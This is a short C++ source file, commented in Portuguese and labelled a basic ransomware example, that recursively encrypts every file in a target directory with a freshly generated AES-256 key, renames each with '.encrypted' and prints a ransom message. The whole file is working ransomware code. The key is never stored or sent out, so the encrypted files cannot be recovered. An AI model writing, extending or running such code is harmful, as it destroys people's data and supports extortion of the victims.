/*

Exemplo básico de ransomware em c++

*/

#include <iostream>
#include <fstream>
#include <experimental/filesystem>
#include <string>
#include <vector>
#include <algorithm>
#include <iterator>
#include <openssl/evp.h>
#include <openssl/rand.h>

// Diretório alvo para criptografar os arquivos
const std::string target_directory = "/caminho/do/diretorio";

// Gerar chave de criptografia
std::string generateKey() {
    std::string key;
    key.resize(EVP_MAX_KEY_LENGTH);

    if (RAND_bytes(reinterpret_cast<unsigned char*>(&key[0]), key.size()) != 1) {
        std::cerr << "Falha ao gerar a chave de criptografia" << std::endl;
        exit(1);
    }

    return key;
}

// Criptografar o conteúdo do arquivo
std::vector<unsigned char> encryptData(const std::string& key, const std::vector<unsigned char>& data) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) {
        std::cerr << "Falha ao criar o contexto de criptografia" << std::endl;
        exit(1);
    }

    if (EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), nullptr, reinterpret_cast<const unsigned char*>(key.c_str()), nullptr) != 1) {
        std::cerr << "Falha ao inicializar a criptografia" << std::endl;
        exit(1);
    }

    std::vector<unsigned char> encryptedData(data.size() + EVP_MAX_BLOCK_LENGTH);
    int encryptedLength = 0;

    if (EVP_EncryptUpdate(ctx, &encryptedData[0], &encryptedLength, &data[0], data.size()) != 1) {
        std::cerr << "Falha ao criptografar os dados" << std::endl;
        exit(1);
    }

    int finalEncryptedLength = 0;

    if (EVP_EncryptFinal_ex(ctx, &encryptedData[encryptedLength], &finalEncryptedLength) != 1) {
        std::cerr << "Falha ao finalizar a criptografia" << std::endl;
        exit(1);
    }

    encryptedLength += finalEncryptedLength;
    EVP_CIPHER_CTX_free(ctx);
    encryptedData.resize(encryptedLength);
    return encryptedData;
}

// Criptografar os arquivos no diretório alvo
void encryptFiles() {
    // Ler todos os arquivos no diretório alvo
    std::vector<std::string> files;
    for (const auto& entry : std::experimental::filesystem::recursive_directory_iterator(target_directory)) {
        if (!std::experimental::filesystem::is_directory(entry.path())) {
            files.push_back(entry.path().string());
        }
    }

    // Ordenar os arquivos
    std::sort(files.begin(), files.end());

    // Gerar a chave de criptografia
    std::string key = generateKey();

    // Criptografar cada arquivo
    for (const auto& file : files) {
        // Ignorar arquivos já criptografados
        if (file.find(".encrypted") != std::string::npos) {
            continue;
        }

        std::ifstream inputFile(file, std::ios::binary);
        std::vector<unsigned char> data(std::istreambuf_iterator<char>(inputFile), {});

        // Criptografar o conteúdo do arquivo
        std::vector<unsigned char> encryptedData = encryptData(key, data);

        // Renomear o arquivo original com a extensão .encrypted
        std::string newFilePath = file + ".encrypted";
        std::experimental::filesystem::rename(file, newFilePath);

        // Escrever o conteúdo criptografado no novo arquivo
        std::ofstream outputFile(newFilePath, std::ios::binary);
        std::copy(encryptedData.begin(), encryptedData.end(), std::ostreambuf_iterator<char>(outputFile));
    }

    // Exibir mensagem de resgate
    std::cout << "Seus arquivos foram criptografados! Para recuperá-los xxx" << std::endl;

}

int main() {
    // Criptografar os arquivos no diretório alvo
    encryptFiles();
    return 0;
}